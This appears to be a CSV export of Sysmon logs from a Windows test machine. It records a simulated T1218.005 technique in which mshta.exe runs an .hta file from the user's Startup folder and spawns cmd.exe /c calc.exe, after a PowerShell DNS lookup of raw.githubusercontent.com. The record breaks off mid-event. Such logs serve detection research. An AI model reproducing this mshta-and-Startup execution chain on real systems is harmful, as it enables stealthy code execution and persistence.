Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,19596,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:08.087

ProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ProcessId: 5660

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a7c8-658c-d101-000000000f00},3588,5660,,,raw.githubusercontent.com,::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-27T22:40:12.8184517Z,,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:08.087,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:12.8184517Z""/>
      <EventRecordID>19596</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:08.087</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7c8-658c-d101-000000000f00}</Data>
      <Data Name=""ProcessId"">5660</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:08.087

ProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ProcessId: 5660

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,calc.exe,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Calculator,,,,,,,1,19595,,10.0.22621.1 (WinBuild.160101.0800),"MD5=2F82623F9523C0D167862CAD0EFF6806,SHA256=9C2C8A8588FE6DB09C09337E78437CB056CD557DB1BCF5240112CBFB7B600EFB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729",C:\Windows\System32\calc.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:12.315

ProcessGuid: {f57bd86a-a7cc-658c-d801-000000000f00}

ProcessId: 11584

Image: C:\Windows\System32\calc.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Windows Calculator

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: CALC.EXE

CommandLine: calc.exe

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2F82623F9523C0D167862CAD0EFF6806,SHA256=9C2C8A8588FE6DB09C09337E78437CB056CD557DB1BCF5240112CBFB7B600EFB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729

ParentProcessGuid: {f57bd86a-a7cb-658c-d401-000000000f00}

ParentProcessId: 11392

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""C:\Windows\System32\cmd.exe"" /c calc.exe

ParentUser: WINDEV2309EVAL\User",Info,CALC.EXE,"""C:\Windows\System32\cmd.exe"" /c calc.exe",C:\Windows\System32\cmd.exe,{f57bd86a-a7cb-658c-d401-000000000f00},11392,WINDEV2309EVAL\User,{f57bd86a-a7cc-658c-d801-000000000f00},3588,11584,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:40:12.3167147Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:12.315,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:12.3167147Z""/>
      <EventRecordID>19595</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:12.315</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7cc-658c-d801-000000000f00}</Data>
      <Data Name=""ProcessId"">11584</Data>
      <Data Name=""Image"">C:\Windows\System32\calc.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Calculator</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CALC.EXE</Data>
      <Data Name=""CommandLine"">calc.exe</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2F82623F9523C0D167862CAD0EFF6806,SHA256=9C2C8A8588FE6DB09C09337E78437CB056CD557DB1BCF5240112CBFB7B600EFB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a7cb-658c-d401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">11392</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\cmd.exe"" /c calc.exe</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:12.315

ProcessGuid: {f57bd86a-a7cc-658c-d801-000000000f00}

ProcessId: 11584

Image: C:\Windows\System32\calc.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Windows Calculator

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: CALC.EXE

CommandLine: calc.exe

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2F82623F9523C0D167862CAD0EFF6806,SHA256=9C2C8A8588FE6DB09C09337E78437CB056CD557DB1BCF5240112CBFB7B600EFB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729

ParentProcessGuid: {f57bd86a-a7cb-658c-d401-000000000f00}

ParentProcessId: 11392

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""C:\Windows\System32\cmd.exe"" /c calc.exe

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,19594,,-,"MD5=69D536A57E2CA570BD305FC17A72FBA4,SHA256=DF554DF7C1611574C9B7D1B783FE851D19A6868FBE035D460EF8D0E0E27151DA,IMPHASH=89539BECC118C763F2798F0B697FEEC1",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:11.964

ProcessGuid: {f57bd86a-a7cb-658c-d701-000000000f00}

ProcessId: 11468

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=69D536A57E2CA570BD305FC17A72FBA4,SHA256=DF554DF7C1611574C9B7D1B783FE851D19A6868FBE035D460EF8D0E0E27151DA,IMPHASH=89539BECC118C763F2798F0B697FEEC1

ParentProcessGuid: {f57bd86a-36f5-658c-0d00-000000000f00}

ParentProcessId: 932

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p

ParentUser: NT AUTHORITY\SYSTEM",Info,-,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\svchost.exe,{f57bd86a-36f5-658c-0d00-000000000f00},932,NT AUTHORITY\SYSTEM,{f57bd86a-a7cb-658c-d701-000000000f00},3588,11468,-,,,,,"
      ",-,,,,,,2023-12-27T22:40:11.9654530Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:11.964,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:11.9654530Z""/>
      <EventRecordID>19594</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:11.964</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7cb-658c-d701-000000000f00}</Data>
      <Data Name=""ProcessId"">11468</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=69D536A57E2CA570BD305FC17A72FBA4,SHA256=DF554DF7C1611574C9B7D1B783FE851D19A6868FBE035D460EF8D0E0E27151DA,IMPHASH=89539BECC118C763F2798F0B697FEEC1</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f5-658c-0d00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k DcomLaunch -p</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:11.964

ProcessGuid: {f57bd86a-a7cb-658c-d701-000000000f00}

ProcessId: 11468

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=69D536A57E2CA570BD305FC17A72FBA4,SHA256=DF554DF7C1611574C9B7D1B783FE851D19A6868FBE035D460EF8D0E0E27151DA,IMPHASH=89539BECC118C763F2798F0B697FEEC1

ParentProcessGuid: {f57bd86a-36f5-658c-0d00-000000000f00}

ParentProcessId: 932

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,19593,,-,"MD5=3E8BF6C2578C0E26CBD699A9E1A48A32,SHA256=34E13A88400216D70CC4BF03DC91AB7911F8A9354A735E4DCB090E73AEB0CE56,IMPHASH=8AEDC24AD9CD564AA66BAB6D1F8D2FDB",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\OpenConsole.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:11.888

ProcessGuid: {f57bd86a-a7cb-658c-d601-000000000f00}

ProcessId: 11436

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3E8BF6C2578C0E26CBD699A9E1A48A32,SHA256=34E13A88400216D70CC4BF03DC91AB7911F8A9354A735E4DCB090E73AEB0CE56,IMPHASH=8AEDC24AD9CD564AA66BAB6D1F8D2FDB

ParentProcessGuid: {f57bd86a-36f5-658c-0d00-000000000f00}

ParentProcessId: 932

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p

ParentUser: NT AUTHORITY\SYSTEM",Info,-,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\svchost.exe,{f57bd86a-36f5-658c-0d00-000000000f00},932,NT AUTHORITY\SYSTEM,{f57bd86a-a7cb-658c-d601-000000000f00},3588,11436,-,,,,,"
      ",-,,,,,,2023-12-27T22:40:11.8891795Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:11.888,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:11.8891795Z""/>
      <EventRecordID>19593</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:11.888</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7cb-658c-d601-000000000f00}</Data>
      <Data Name=""ProcessId"">11436</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=3E8BF6C2578C0E26CBD699A9E1A48A32,SHA256=34E13A88400216D70CC4BF03DC91AB7911F8A9354A735E4DCB090E73AEB0CE56,IMPHASH=8AEDC24AD9CD564AA66BAB6D1F8D2FDB</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f5-658c-0d00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k DcomLaunch -p</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:11.888

ProcessGuid: {f57bd86a-a7cb-658c-d601-000000000f00}

ProcessId: 11436

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.3181.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3E8BF6C2578C0E26CBD699A9E1A48A32,SHA256=34E13A88400216D70CC4BF03DC91AB7911F8A9354A735E4DCB090E73AEB0CE56,IMPHASH=8AEDC24AD9CD564AA66BAB6D1F8D2FDB

ParentProcessGuid: {f57bd86a-36f5-658c-0d00-000000000f00}

ParentProcessId: 932

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\cmd.exe"" /c calc.exe",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,,1,19592,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:11.849

ProcessGuid: {f57bd86a-a7cb-658c-d401-000000000f00}

ProcessId: 11392

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\System32\cmd.exe"" /c calc.exe

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {f57bd86a-a7cb-658c-d301-000000000f00}

ParentProcessId: 11308

ParentImage: C:\Windows\System32\mshta.exe

ParentCommandLine: ""C:\Windows\system32\mshta.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\system32\mshta.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""",C:\Windows\System32\mshta.exe,{f57bd86a-a7cb-658c-d301-000000000f00},11308,WINDEV2309EVAL\User,{f57bd86a-a7cb-658c-d401-000000000f00},3588,11392,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:40:11.8510082Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:11.849,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:11.8510082Z""/>
      <EventRecordID>19592</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:11.849</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7cb-658c-d401-000000000f00}</Data>
      <Data Name=""ProcessId"">11392</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\System32\cmd.exe"" /c calc.exe</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a7cb-658c-d301-000000000f00}</Data>
      <Data Name=""ParentProcessId"">11308</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\mshta.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\mshta.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:11.849

ProcessGuid: {f57bd86a-a7cb-658c-d401-000000000f00}

ProcessId: 11392

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\System32\cmd.exe"" /c calc.exe

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {f57bd86a-a7cb-658c-d301-000000000f00}

ParentProcessId: 11308

ParentImage: C:\Windows\System32\mshta.exe

ParentCommandLine: ""C:\Windows\system32\mshta.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\mshta.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft (R) HTML Application host,,,,,,,1,19591,,11.00.22621.2506 (WinBuild.160101.0800),"MD5=36D15DDE6D71802D9588CC0D48EDF8EA,SHA256=7B70B26081CFA5FAE721F6E0A63960034D25CC94D157CD649A4E9907B5AF37EA,IMPHASH=DCDEE2FF2311B9AE7C4D768FA56524DD",C:\Windows\System32\mshta.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:11.630

ProcessGuid: {f57bd86a-a7cb-658c-d301-000000000f00}

ProcessId: 11308

Image: C:\Windows\System32\mshta.exe

FileVersion: 11.00.22621.2506 (WinBuild.160101.0800)

Description: Microsoft (R) HTML Application host

Product: Internet Explorer

Company: Microsoft Corporation

OriginalFileName: MSHTA.EXE

CommandLine: ""C:\Windows\system32\mshta.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=36D15DDE6D71802D9588CC0D48EDF8EA,SHA256=7B70B26081CFA5FAE721F6E0A63960034D25CC94D157CD649A4E9907B5AF37EA,IMPHASH=DCDEE2FF2311B9AE7C4D768FA56524DD

